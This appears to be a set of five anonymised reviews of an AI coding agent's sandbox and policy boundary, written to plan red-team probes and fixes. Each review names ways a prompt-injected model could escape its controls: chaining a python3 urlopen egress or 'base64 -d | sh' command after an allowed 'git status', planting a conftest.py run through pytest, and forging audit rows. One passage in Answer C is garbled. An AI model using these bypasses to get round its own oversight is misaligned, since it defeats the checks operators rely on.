# Anonymous advisor answers

Five independent answers to the question in `framed-question.md`. Labels were
assigned by a real random shuffle. Reviewer: judge the answers, not the authors.

---

## Answer A

## Council answer — upside-hunting boundary review

**Threat model [MATERIALS].** Who is trusted: (1) the remote model — *not* trusted for behavior, only for content; every action is gated locally (`agent.py:2984` `dispatch_tool` runs plan gate → dossier gate → policy gate → ask before any tool). (2) The local user — fully trusted by the current design, and that is the load-bearing assumption: they can edit `agent.py`, the TOML, or point `TAMIAS_BASE_URL` at a friendly gateway. (3) The local Python process — treated as authoritative today; `run_shell` executes `shell=True` with a scrubbed env (`agent.py:1251-1258`). (4) The gateway — trusted, but the agent never checks the manifest signature (`docs/BOUNDED-AGENT.md:146-149`); that's the gateway's job, so a malicious gateway wins by definition. (5) The OS — trusted, i.e., unenforced; RELEASE-STATUS.md:40 admits "OS sandbox: not built, best-effort shell guard only." Confidence: High.

**The one bypass nobody should kid themselves about [MATERIALS + INFERENCE].** The shell guard is lexical, and the shell allowlist is substring-based (`agent.py:2802-2808`: `pattern in command`). Once any allowed family matches, everything after the first `;` inherits the clearance. Concrete claims:

- `git status; python3 -c "import urllib.request,os,glob; urllib.request.urlopen('http://'+ ...)"` [INFERENCE]: matches an allow family, hits no deny token (`http://...` doesn't start with `/`), passes `shell_escapes_company` (lines 1172-1200 scans only literal tokens — no `$()`, backticks, or runtime-computed paths). Arbitrary egress, arbitrary behavior, all inside the "allowed" family. Confidence: High.
- Data-dependent paths: `python3 -c "open(sorted(glob('*'))[0])"` never spells `../` or `/etc` — the token scan can't see it [INFERENCE, High].
- Base64 delegation: `git status; echo cm0... | base64 -d | sh` contains no denied substring [INFERENCE, High].

The repo's own doc concedes this — `BOUNDED-AGENT.md:192-195` calls `run_shell` "the sharp edge." So the framing question's real answer: a *company-set* boundary **can be exceeded today via the shell tool**, and the honest label is "product-level, best-effort at shell," not "company guarantee" [OPINION, High].

**Where company / product / task diverge [INFERENCE, Medium].** The policy enforces company (fence) and product (`allow_write` at toml:53), but *task* scope is only `domain_check` (agent.py:2863-2892) — a lexical gate over request text that the code itself calls "a scope guard, not a security boundary" (line 2873-2874). Reads default company-wide; nothing limits the todo agent to one ticket. Nobody mentioned that the model's own prompt channel is an exfiltration channel: company code is shipped to OpenRouter by design, and no `[network]`/host allowlist exists in `policies/todoinc-todo.toml` even though `BOUNDED-AGENT.md:99-101` sketches one [FACT from materials, gap unverified in code].

**Test evidence: what's proven vs asserted [FACT].** The 374 tests and 17 probes prove the *deterministic gates* behave (deny wins, realpath, fail-closed ask). They prove almost nothing about *adversarial* input — every benign probe passes; no mutation, obfuscation, or multi-step escape is in the suite. The live stage repair (RELEASE-STATUS.md:37) remains unproven per the two-pass rule.

**Missing upside — the cheapest wins sitting right here [OPINION, Medium].** (1) This codebase is *made* for adversarial red-team probes; add ~10 hostile shell probes (delegation, runtime paths, env-expansion, chained after allow-family) to `demo/check_boundary.py` and publish the failures as documented limits. That converts the current silent gap into the project's best sales asset: "here is exactly what our product boundary does *not* claim." (2) The audit JSONL (`agent.py:2952-2958`) is written by the process it audits, with `except OSError: pass` — a hash-chained row is one afternoon and makes the trail tamper-evident, which companies actually buy.

**Demo-blocking vs production-blocking.** Demo-blocking: nothing — the demo is honest if labeled. Production-blocking: shell escape (any), BYO-gateway (RELEASE-STATUS.md:41), unsigned policy hop.

**Verdict on options: B** [OPINION, High] — the dispatcher is a good policy layer; only the kernel below it can make "people should not be able to bypass that" true.

One concrete next step (≤1 day): write and run the 10-probe adversarial shell battery offline, record pass/fail in RELEASE-STATUS.md, and relabel the boundary line accordingly.

One-line verdict: The deterministic gates are genuinely solid; the shell tool is a one-liner bypass away from unrestricted egress, so claim product-level not company-level — and the cheapest upside is weaponizing the known gaps into an adversarial probe suite that proves the boundary's honesty.

---

## Answer B

## What is actually being solved

Not "which layer to add." The unasked question is **against whom is the fence drawn?** The option list (A/B/C) presumes the fence is drawn against the *model* while the *local user* is inside it. If the fence is meant to bind the employee, options A and B both fail by construction and C fails without client-side pinning.

## Hidden assumptions, challenged

1. **"The policy is an authority."** It is a TOML file read by the same process the user controls. [FACT] `policy_check` returns `None` outright when `_ACTIVE_POLICY is None` (`agent.py:2786-2788`), so a run without `--policy`/`--company-id` has **no** tool, path, shell, or domain gate at all. Bypass #1 is "don't opt in." [FACT]
2. **"Managed mode is a company guarantee."** [FACT] the agent does not verify the manifest signature (`docs/BOUNDED-AGENT.md:146-149`); `docs/RELEASE-STATUS.md:41` already concedes "Bring your own gateway bypass possible." A user points `TAMIAS_BASE_URL` at any host serving any policy. [INFERENCE, High]
3. **"deny_read is per-file."** It is per-*argument*. [FACT] only `trace_feature` re-checks each file (`agent.py:1769-1771`); `search_in_files` (`:1550-1554`), `investigate_target` (`:1694`), `list_directory` (`:1404`), `analyze_structure` check only the secret name denylist. So `search_in_files("token", "company/work/todoinc")` reads `chatbot/*.py` and `hr/*.md` — the exact probe #4 the team believes passes. The demo passes because the probe uses the *denied path as the argument* (`demo/check_boundary.py:87-88`). [FACT code / INFERENCE exploit, High]
4. **"Shell families are scoped."** Deny is substring (`agent.py:2804`), allow is substring (`:2807`), executed with `shell=True` (`:1251-1253`). `python3 -m pytest` is an allowed family and pytest executes `conftest.py` — arbitrary Python with no token scan. `python3 -m pytest >/tmp/x` also passes `shell_escapes_company` because the token starts with `>`, not `/` (`:1193`). [INFERENCE, High; unverified by execution]
5. **"The boundary is the product."** It is the company. `resolve_in_company_workspace` fences at `company/work/<id>/` (`:1486`); the product fence is `allow_write` only. [FACT] For `todoinc`, reads of any other app are legal.

## Threat model (my read)

Trusted: the gateway (only in managed mode, and only by assertion), the local Python process, the OS. Untrusted: the remote model. **The local user is treated as trusted, which is the whole problem.** [OPINION, High]

## Scope

Company ≠ product ≠ task. Company and product diverge on reads (above). Task diverges furthest: `domain_check` is lexical and self-declared "not a security boundary" (`agent.py:2873-2875`); the plan gate holds shell to a signature but not to the file list (framed §4). The task boundary is prose. [FACT]

## Evidence

374 tests prove the dispatcher behaves as written for the *probed argument forms*. They do not prove escape resistance; no test I saw asserts the parent-directory or redirect paths. `demo/check_boundary.py` "denied-below" accepts *any* `Error:` (`:115-118`) — a weak assertion. [FACT]

**Demo-blocking:** none of the above. **Production-blocking:** (1) opt-out by omission, (2) per-file deny_read, (3) shell `shell=True`, (4) unpinned gateway.

The question optimizes the wrong variable (layer count) instead of the trust set. **Option D**: declare the fence anti-model only, then B is proportionate; declare it anti-employee and you need C with client-pinned keys *plus* B — A is not an option in that world at all.

**One-day step:** add `demo/attacks.py` — 8 probes expected to *succeed* today (search from parent, list from parent, `>/tmp`, conftest pytest, no-policy run, rogue gateway), each xfail-documented in RELEASE-STATUS. Convert the claim from "boundary holds" to a calibrated table in one day.

One-line verdict: The fence is real against the model and fiction against the user — publish the trust set before adding layers.

---

## Answer C

## Executor verdict on the boundary review

**Trust model — stated as it actually is.** The only hard boundary in this repo is the local Python process (`agent.py`) checking its own inputs; there is no kernel, container, or signed-layer enforcement anywhere [FACT: `docs/RELEASE-STATUS.md` "What is blocked" — OS sandbox not built, client-pinned manifest not built]. So: local user = root of trust (can edit `agent.py`, dropping every gate); local process = enforcement point and trusted; remote model = fully untrusted, correctly treated so; gateway = trusted, but the agent never verifies the manifest signature itself (`BOUNDED-AGENT.md` §"Managed mode"; `fetch_policy`, agent.py:2698–2723, trusts whatever JSON arrives). Confidence: High.

**Enforcement per layer.** Tool allowlist, shell family rules, allow_write/deny_read globs, ask-fail-closed, realpath containment — all real and per-action, gated at the top of `dispatch_tool` (agent.py:2984–3024); deny wins; headless ask denies [FACT: code cited]. Investigation tools are correctly inside `READ_TOOLS`/`PATH_ARG` (agent.py:2477–2494) [FACT]. Confidence: High.

**Bypasses I can name concretely:**

1. **Composite shell commands defeat the substring allowlist.** `shell_allow` matching is `any(pattern in command)` (agent.py:2807) and the path guard only scans whitespace tokens for absolute/`..`/`~` escapes (agent.py:1172–1200). So `python3 -m pytest -q && python3 -c "print(open('company/work/todoinc/hr/salaries.csv').read())"` passes the allow family, passes the path guard (relative path inside cwd), and executes arbitrary Python under the company cwd [INFERENCE from code, unverified by running it — but the repo itself concedes this: `BOUNDED-AGENT.md` "Honest limits": "a determined prompt-injected command can still find unguarded operators"]. Arbitrary Python then reaches the network — there is **no egress layer at all** (no `[network]` handling exists in the loader, agent.py:2517–2574, versus the design's promise in `BOUNDED-AGENT.md` §3)."— wait, `[design's promise🗂 in §4 example]. Confidence: High on the gap; the exact payload is "plausible, unverified."`
2. **Audit is appendable, not integral.** The audit file (`policies/todoinc-todo.audit.jsonl`) is not in `PROTECTED_PATHS` (only the policy file is protected at agent.py:4699), and an allowed composite command can append forged rows [INFERENCE]. Confidence: Medium.
3. **Plan gate is file-list only for writes; shell is signature-gated but not path-scoped** — the framed-question itself states this; code confirms (`plan_write_block` agent.py:2306 only checks `WRITE_TOOLS`). Confidence: High.
4. **`--unbounded` / running from a checkout**: enforcement is opt-in via flags and default-path deployment policy (agent.py:4710–4738) — good default, but whoever runs `--unbounded` has no fence [FACT].
5. **`demo/check_boundary.py` wires the fences by hand rather than through `main()`** (lines 51–58) — an honest probe, but it tests the setup the demo assumes, not the production startup path [MATERIALS].

**Company vs product vs task.** The fence is company+product (company/workspace + allow_write globs). It is **not task-scoped**: nothing marks "this run's task," and the plan contract is the only task scoping, and it doesn't cover shell paths. Divergence point: product scope is granted, task scope is only advisory. Confidence: High.

**Test evidence.** 374 passing tests and offline probes are real [MATERIALS], but they prove the gates deny the *canonical* probes. They do not prove: composite-command safety (no such probe), network restriction (none exists), or live-model behavior (latest live run 0/2, rate-limited — `RELEASE-STATUS.md`). Demo-blocking: none — the honest posture is fine for a demo. Production-blocking: shell escape (1), egress (none), agent-signature gap / bring-your-own-gateway (option C territory).

**Monday morning, one working day:** add three composite-command probes to `demo/check_boundary.py` (pytest+`python3 -c`, pytest+`&&` redirect into the audit file, `git status` + redirect) and confirm they are denied; where not, tighten `run_shell` to reject any command containing a second shell operator (`;`, `&&`, `|`, backticks, `>`) — one regex in `shell_escapes_company`, offline-testable.

**Two-week sequence:** (1) day 1 probes + operator filter; (2) days 2–4: implement the `[network]` egress stub fail-closed in managed mode via gateway-side key scoping; (3) week 2: run the two-consecutive-passes live gate after the changes, and add audit-path `protect_path`. **Deliberately not yet:** OS/container isolation (option B) and the client-pinned manifest (option C) — real work, but they don't block the offline demo and would be built on an unfixed shell layer.

One-line verdict: The in-process fence is real and per-action but shell composite commands and the absent egress layer let the product/company boundary be exceeded, so tighten `run_shell` first and label the rest honestly rather than claim a company guarantee today.

---

## Answer D

**What I do not understand as a newcomer.** The demo's core nouns — "dossier", "plan contract", "checkpoint", "boundary card", "managed mode", "company fence" — are never defined in plain language for a buyer; I had to read `agent.py` to know what is being guaranteed. [MATERIALS] That itself is a presentation risk.

**Threat model.** The remote model is distrusted: `domain_check` runs before spend (agent.py:2863) and the policy gate sits inside `dispatch_tool` (agent.py:3000-3002). The OS and the local user are fully trusted: `run_shell` is `subprocess.run(shell=True)` as the invoking user (agent.py:1251-1259). Critically, with no active policy `policy_check` returns `None` (agent.py:2786-2788), so tool allowlist, `deny_read`, `allow_write` are all silently off; the user picks the policy path via `--policy` and can edit or delete it, or edit `agent.py`. Confidence: High. So the user's ask — "people should not be able to bypass that" — is **not met** for the local employee under Options A or B; only managed mode narrows it, and even there the agent does not verify the manifest signature (BOUNDED-AGENT.md:149) and the client-pinned manifest is "Not built — 'Bring your own gateway' bypass possible" (RELEASE-STATUS:41).

**Enforcement layers.** Order: plan gate → dossier gate → policy gate (tool deny wins, read-only, shell families, path globs) → ask (headless = deny, agent.py:3004-3010) → checkpoint → tool. Tools re-resolve realpath containment internally (agent.py:1345-1358, 1457-1488) — genuine defence in depth, High confidence. Investigation tools are in `READ_TOOLS`/`PATH_ARG` (agent.py:2477-2494), so `deny_read` covers them at the policy layer. But `search_in_files` reads a directory tree: a denied path nested under an allowed root is not skipped per file. Audit rows are appended and bodies redacted, but append failures are swallowed (agent.py:2956-2958) and the JSONL is a local, forgeable file.

**Bypasses.**
1. **Interpreter escape (the big one).** `python3 -m pytest` is an allowed shell family (policy:30) and executes repo code; a model-written `conftest.py` inside the product runs with full user privileges — readable: `hr/`, `.env`, network, any write path. The shell guard only token-scans the command *string* (agent.py:1172-1219). BOUNDED-AGENT.md "Honest limits" admits this. [MATERIALS+INFERENCE] High confidence; untested — no probe exists.
2. **Substring family gate.** Any command *containing* "git status" passes allow (agent.py:2807); only literal "rm ", "curl " etc. are denied.
3. **Network.** No egress layer exists; the shipped policy has no `[network]` block — that section is only in the proposal template (BOUNDED-AGENT.md:99-102).
4. **Plan/dossier.** Shell is signature-gated but not path-scoped by the signed file list (framed-question #9).

**Scope divergence.** Task = lexical `domain_check`, whose own docstring says "scope guard, not a security boundary" and is trivially satisfied by "item"/"task" (agent.py:2873). Product = `allow_write` globs. Company = realpath fence *and* shell cwd — so shell runs company-wide, not product-wide. Three scopes, one demo card.

**Test evidence.** Proven: 374 offline tests and 17 deterministic probes refuse the exact listed strings (demo/check_boundary.py; RELEASE-STATUS:52). Only asserted: real-model behaviour — latest live run 0/2 rate-limited (RELEASE-STATUS:37) — and any adversarial-shell behaviour, which no probe covers.

**Blocking.** Demo-blocking: none if everything is labelled offline and the phrase "company guarantee" is dropped. Production-blocking: OS sandbox, egress control, verified/pinned manifest or gateway-side execution, the pytest/conftest escape, audit integrity, and a written threat model stating the local user is trusted. [OPINION] Medium-High.

**Next step (one day).** Add `demo/redteam_boundary.py`: ~10 adversarial shell strings (`echo x; git status`, `git status; ls ../hr`, conftest execution) through `dispatch_tool`, recording honest fails; anchor the shell allow gate to whole-command prefix match.

One-line verdict: The boundary honestly fences a well-meaning model offline; it is not yet a company guarantee against the local user, the network, or an allowed-interpreter escape — say so, then add OS/egress isolation before claiming more.

---

## Answer E

**Contrarian / boundary review — what fails anyway**

**1. The shell is the boundary's open door, and the policy itself invites the model through it.** [FACT] The policy (`policies/todoinc-todo.toml` §[run_shell]) allows `python3 -m pytest`, and `run_shell` is *not* in `[tools] ask` (only `write_file`, `edit_file`, `create_directory` are, §[tools]). [INFERENCE, unverified] pytest imports `conftest.py` from cwd; one ask-approved product write plants one, and one "allowed" `python3 -m pytest` command executes arbitrary Python — reading `hr/salaries.csv`, rewriting the policy, opening symlinks, spawning `curl`. `shell_escapes_company` (`agent.py:1172-1200`) only token-scans for `~`, `..`, and absolute paths; its own docstring says "Shell cannot be fully sandboxed from pure Python … best-effort." `BOUNDED-AGENT.md` "Honest limits" concedes the same. The company guarantee is therefore anchored to a single human "yes" that the demo is *designed* to elicit. Confidence: High.

**2. Cross-project reads survive the guard, likely never probed.** [INFERENCE, unverified] From `cwd=company/work/todoinc/`, `git log -p apps/chatbot/<file>` contains an allowed substring, no absolute path, no `..` — the token scanner passes it, and git resolves the relative path against cwd into another project. The 12-probe list in the framed question tests only direct `hr/salaries.csv` style reads, per `demo/check_boundary.py` §probes. Confidence: Medium.

**3. The company fence is operator-owned.** [FACT] With `--company-id` absent, `resolve_in_company_workspace()` explicitly degrades to the workspace fence (`agent.py:1473-1478`, which documents the *prior* bug: "they were an unfenced read primitive"). One omitted CLI flag and the company wall collapses; nothing fails closed on that locally. Confidence: High.

**4. In-process enforcement is a suggestion on the user's own machine.** [FACT] With `--require-proxy` absent, the local policy file (`~/.config/tamias/policies/*`, `BOUNDED-AGENT.md` §80) is owned by the same user; `TAMIAS_ALLOW_SHELL=0` aside, `agent.py` can simply be edited on disk before running. Managed mode does not fix this since `fetch_policy` (`agent.py:2698-2723`) takes no signature verification and trusts the gateway reply, and `RELEASE-STATUS.md` §"What is blocked" marks the OS sandbox and client-pinned manifest as not built ("Bring your own gateway" bypass possible). The agent interpreting the rules it runs from the same process globals (`_ACTIVE_POLICY`) means planted code can reset them — [INFERENCE] unverified, but no layer defends its own memory. Confidence High on the facts, High on the conclusion.

**5. Layer divergence.** [FACT] Product (`allow_write`/`deny_read`/plan contract) and task (`domain_check` lexical filter, `agent.py:2863-2892`) enforce separately; shell enforces company; investigation tools enforce company. [INFERENCE] Nothing composes into the "task, not a wider strike surface" case — `domain_check` itself warns "words are easy to evade … this is a scope guard, not a security boundary." Confidence: Medium.

**6. Evidence vs claims.** [FACT] The 374-test suite and 17-probe demo are unit-style probes of each layer in isolation, against friendly inputs (`demo/check_boundary.py`, `demo/showcase.py`); no probe attempts the conftest/pytest composition, cwd-relative shell escapes, or self-modification. [INFERENCE] What is "proven" is each gate on its friendly path; what is asserted is composition. This gap, not the suite count, is the missing proof for a company-facing claim. Confidence: Medium.

**Demo-blocking vs production-blocking.** [OPINION] Demo-blocking: conftest-via-pytest arbitrary execution and any cwd-relative cross-project read — these break the video's "boundary does not exceed" story and cannot be papered over with prose, since `BOUNDED-AGENT.md` itself already concedes the edge ("a determined prompt-injected command can still find unguarded operators"). Production-blocking: OS/container isolation and the signed, client-pinned manifest (`RELEASE-STATUS.md` both rows "not built"). The docs are more honest than the guarantee: a company-facing claim contradicts "Honest limits" as written. Removing `python3 -m pytest` from the allowlist (and keeping `run_shell` ask-gated) is the least.Day move that directly removes the sharpest flaw without inventing a new architecture — otherwise Option B is the honest minimum and Option C the right shape if the manifest is actually built and pinned.

**Next step ≤1 working day.** [OPINION] Write `demo/attack_boundary.py` with exactly two cases — (i) an ask-approved product-area `conftest.py`, then `python3 -m pytest`; (ii) `git log -p apps/chatbot/<file>` from the company cwd — run it, and either put the fix (`python3 -m pytest` out of the allowlist or shell moved behind ask) or publish both rows in `RELEASE-STATUS.md` "What is blocked" with the conftest row as a named bypass, not prose. Confidence: High.

One-line verdict: The in-process dispatcher is a good demo boundary and a weak company guarantee — `python3 -m pytest` is a one-command arbitrary-code bypass; strip `python3 -m pytest` below the allowlist and adversarially probe before calling it company-guaranteed.
